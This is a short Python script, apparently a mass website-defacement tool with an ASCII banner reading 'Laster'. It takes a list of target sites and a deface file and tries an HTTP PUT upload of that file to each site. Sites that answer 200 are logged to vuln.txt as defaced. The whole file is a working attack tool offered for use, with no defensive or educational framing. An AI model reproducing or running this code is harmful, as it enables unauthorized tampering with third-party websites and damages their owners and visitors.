import requests
import os

def banner():
	print("""\033[33m
             
██╗░░░░░░█████╗░░██████╗████████╗███████╗██████╗░
██║░░░░░██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██║░░░░░███████║╚█████╗░░░░██║░░░█████╗░░██████╔╝
██║░░░░░██╔══██║░╚═══██╗░░░██║░░░██╔══╝░░██╔══██╗
███████╗██║░░██║██████╔╝░░░██║░░░███████╗██║░░██║
╚══════╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
	   
                   Laster ON TOP


\033[37m""")

def main():
	list=input(" Enter your sites list sexy boy: ")
	opened=open(list,"r")
	d=input(" Enter deface file madry: ")
	data=open(d).read()
	d="/"+d
	for i in opened:
		try:
			i=i.strip()
			if 'http://' not in i:
				i='http://'+i
			req=requests.Session().put(i+d,data=data)
			if req.status_code==200:
				print(" [ ✓ ] \033[32m Vuln => \033[37m",i+d)
				f=open("vuln.txt","a")
				f.write(i+d+"\n")
				f.close()
			else:
				print(" [ ✗ ] \033[31m Not vuln => \033[37m",i+d)
		except  requests.exceptions.RequestException:
			continue

banner()
main()
print('\n\033[36m','  [+] ','\033[37m Deafced Sites are saved as vuln.txt ','\033[36m [+] \033[37m')
print (" [+] type cat vuln.txt to show vuln websites")
